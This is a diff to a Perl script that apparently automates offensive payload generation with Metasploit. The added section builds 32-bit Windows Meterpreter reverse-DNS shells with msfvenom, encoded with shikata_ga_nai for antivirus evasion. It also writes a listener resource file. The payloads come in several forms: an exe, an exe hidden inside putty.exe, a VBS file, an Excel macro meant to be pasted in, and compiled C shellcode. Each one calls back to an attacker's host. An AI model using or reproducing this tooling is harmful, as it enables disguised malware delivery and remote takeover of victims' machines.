@@ -10,6 +10,7 @@ use warnings;
   my($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst);
   my($scriptNum,$scriptName, $batchfile);
   my($dieMessage);
+  my($DNSPort);
 
   $dieMessage = "";
   $LHOST = shift or $dieMessage .= "Expecting an IP address in arg 1\n";  
@@ -534,7 +535,6 @@ TCPSTAGELESS64
   ##
   ##################
 
-  #`touch $targetFolder/200-${PROJECT}-${PROJECTNUM}-Run950.cue`;
   $scriptNum="200";
   open( $OUTFILE, '>', "$targetFolder/${scriptNum}-reversehttps.rc");
 print $OUTFILE <<RHTTPSNOENC;
@@ -639,7 +639,7 @@ MACSHELL1
   `$cmd`;
   `perl -p -i -e 's/, _.*\n/, /g' $targetFolder/$scriptName`;
 
- ###################
+  ###################
   ##
   ##  Mac 64 bit
   ##
@@ -676,9 +676,76 @@ MACSHELL1
   `$cmd`;
   `perl -p -i -e 's/, _.*\n/, /g' $targetFolder/$scriptName`;
 
+ ###################
+  ##
+  ##  32bit DNS Encoded
+  ##
+  ##################
+
+  $encoder = '-e x86/shikata_ga_nai -i 17 -b "\x00\xFF" ';
+  $payload = 'windows/meterpreter/reverse_tcp_dns';
+  $platform_arch = '--platform win -ax86';
+  $DNSPort=53;
+  $commandControl = "lhost=$LHOST lport=$DNSPort";
+
+ $scriptNum="500";
+  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-MeterpreterReverseTCPDNS-32.rc");
+print $OUTFILE <<DNS1;
+use multi/handler
+set payload $payload
+set LHOST $LHOST
+set LPORT $DNSPort
+set ExitOnSession false
+set EnableStageEncoding true
+exploit -j
+DNS1
+  close $OUTFILE;
 
 
+  $scriptNum ="511";
+  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreterDNS-32enc.exe";
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/$scriptName";
+  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter encoded: $cmd";
+  `$cmd`;
+  `echo $scriptName >>$batchfile`;
 
+  $scriptNum ="512";
+  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreterDNS-packed-putty-32enc.exe";
+  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/$scriptName";
+  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter encoded, packed into putty: $cmd \n";
+  `$cmd`;
+  `echo $scriptName >>$batchfile`;
+
+  $scriptNum ="513";
+  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreterDNS-32enc.vbs";
+   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
+   print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter  encoded vbs(Download and pass as arg to cscript or double click): $cmd \n";
+  `$cmd`;
+  `echo $scriptName >>$batchfile`;
+
+
+  #tuning encoder down to 1 for VBA
+  #consistently had issues with this running.
+  $scriptNum ="514";
+  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreterDNS-32enc.vba";
+  $encoder = '-e x86/shikata_ga_nai -i 1 -b "\x00\xFF" ';
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder  > $targetFolder/$scriptName";
+  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter vba encoded  (Paste into Excel Macro): $cmd\n";
+  `$cmd`;
+  `perl -p -i -e 's/, _.*\n/, /g' $targetFolder/$scriptName`;
+
+  $scriptNum ="515";
+  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedCustomTemplateDNS-32enc.c";
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c  > $targetFolder/$scriptName";
+  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter C Shell Code, encoded: $cmd\n";
+  `$cmd`;
+  &createShellcodeEXEFromTemplate(385,"$targetFolder/$scriptName");
+  $scriptName =~s/c$/exe/;
+  `echo $scriptName >>$batchfile`;
+
+
+#reset Command and control
+  $commandControl = "lhost=$LHOST lport=$LPORT";
 
 
   ###################
